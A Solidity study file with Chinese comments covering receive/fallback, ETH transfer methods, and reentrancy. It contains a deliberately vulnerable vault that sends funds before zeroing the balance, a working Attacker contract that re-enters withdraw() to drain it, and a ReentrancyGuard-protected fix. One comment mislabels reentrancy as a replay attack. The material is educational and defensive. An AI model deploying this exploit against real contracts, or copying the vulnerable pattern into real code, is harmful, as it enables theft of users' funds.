


// SPDX-License-Identifier: MIT
pragma solidity ^0.8;


/*
特性	          receive()	              fallback()
是否能接收 ETH	是（必须是 payable）	 可选（payable 或不写）
是否接收 data	否（data 必须为空）	     是（data 非空或无函数匹配）
是否必须存在	否（可选）	               否（可选）
常见触发条件	纯 ETH 转账，无数据	错误调用或带 data 转账
*/
contract MyContract {  // 收款方式
    event Received(address sender, uint amount);

    receive() external payable {  // 只接收eth
        emit Received(msg.sender, msg.value);
    }

    event FallbackCalled(address sender, uint amount, bytes data);

    fallback() external payable {  // 对任何未知调用做处理（比如 proxy、日志记录）
        emit FallbackCalled(msg.sender, msg.value, msg.data);
    }
    // 如果两个都写了会优先调用receive 在data为空时调用fallback

    // function funcName() public payable returns (uint) {
    //     return address(this).balance;
    // }
}


contract Vault {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "Withdraw failed");
    }

    // 转账
    // payable(msg.sender).transfer(1 ether);  固定 2300 gas，失败自动 revert

    // bool success = payable(msg.sender).send(1 ether); 只提供 2300 gas，但需要手动检查返回值
    // require(success, "Send failed");

    // (bool success, ) = payable(msg.sender).call{value: 1 ether}("");  
    // require(success, "Call failed");                可调 gas，兼容新版本，官方推荐方式

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}


// VulnerableVault.sol
contract VulnerableVault {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        require(balances[msg.sender] > 0, "No balance");

        // 发送 ETH（外部调用，容易被攻击者重入）
        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(success, "Transfer failed");

        // 更新余额（放在调用后，导致漏洞）
        balances[msg.sender] = 0;
    }
}


// Attacker.sol
contract Attacker {
    VulnerableVault public target;

    constructor(address _target) {
        target = VulnerableVault(_target);
    }

    // 回调函数，趁机再次提取
    receive() external payable {
        if (address(target).balance > 1 ether) {
            target.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        target.deposit{value: 1 ether}();
        target.withdraw();
    }
}


import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
// 防重放攻击
contract SecureVault is ReentrancyGuard {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint amount = balances[msg.sender];
        require(amount > 0, "No balance");
        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
